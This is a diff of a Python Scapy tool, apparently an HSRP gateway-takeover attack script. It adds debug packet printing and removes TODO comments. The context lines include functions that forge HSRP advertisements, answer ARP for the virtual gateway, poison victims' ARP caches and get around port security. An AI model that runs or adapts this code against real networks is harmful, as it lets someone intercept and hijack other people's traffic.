@@ -114,13 +114,12 @@ def check_hsrp(packet):
             print("[HSRP] Active router IP: ", packet[IP].src)
             print("[HSRP] Virtual gateway IP: ", packet[HSRP].virtualIP)
             print("[HSRP] HSRP Hello time: ", packet[HSRP].hellotime)
+            packet.show()
         version = 1
         hsrpfound = True
         pkcopy = packet
     else:
         ethersrc = packet[Ether].src
-        # TODO to improve on HSRPv2 detection, currently based on source mac address only and fails if standby group number changes, someone work on this pls thanks
-        ########################################
         gp = hex(packet['HSRP'].reserved)[2:].zfill(3)
         gp = gp[:1] + ':' + gp[1:]
         if packet['Ethernet'].src == "00:00:0c:9f:f" + gp:
@@ -130,6 +129,9 @@ def check_hsrp(packet):
                     hsrpfound = True
                 return
             print("[INFO] Active HSRP found, version 2")
+            if debug:
+                # show HSRPv2 packet structure for debug purposes
+                packet.show()
             version = 2
             hsrpfound = True
             pkcopy = packet
@@ -199,8 +201,6 @@ def send_hsrp(packet):
         selective_poison.start()
         sendp(pkt, inter=packet[HSRP].hellotime, loop=1, verbose=False)
     else:
-        # TODO Extract bytes from HSRP packet using script, do not hard code HSRP bytes. Someone work on this pls thanks
-        ###################################
         eth = Ether(src=ethersrc, dst=etherdst)
         ip = IP(src=myip, dst=ipdst, len=80, ttl=ipttl)
         udp = UDP(sport=sport, dport=dport, len=60)
@@ -251,7 +251,6 @@ def send_initial_arp(type, pause=True):
         virtualIP = pkcopy[HSRP].virtualIP
         hellotime = pkcopy[HSRP].hellotime
     elif version == 2:
-        ################
         virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
         hellotime = v2hellotime
     if type == 0:
@@ -272,7 +271,6 @@ def start_arp_responder(packet):
     if version == 1:
         virtualIP = packet[HSRP].virtualIP
     elif version == 2:
-        ########################
         virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     if debug:
         print(f"[DEBUG] Responding to ARP requests for {virtualIP}")
@@ -285,7 +283,6 @@ def arp_respond(packet):
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
     elif version == 2:
-        #####################
         virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     if attackportsecurity:
         ethersrc = mymac
@@ -327,7 +324,6 @@ def arp_poison(packet):
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
     elif version == 2:
-        ###########################
         virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     try:
         victimIP = packet[IP].src
@@ -430,7 +426,6 @@ def start_subinterface():
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
     elif version == 2:
-        #######################
         virtualIP = pkcopy['HSRP MD5 Authentication'].sourceip
     if debug:
         print(f"Starting sub interface with IP: {virtualIP} on {interface}")
@@ -464,7 +459,6 @@ def delayed_failure_check():
     if version == 1:
         hellotime = pkcopy[HSRP].hellotime
     elif version == 2:
-        ####################
         hellotime = v2hellotime
     # will change hsrpfound to true if active hsrp found
     check_fail = threading.Thread(target=find_hsrp, daemon=True)
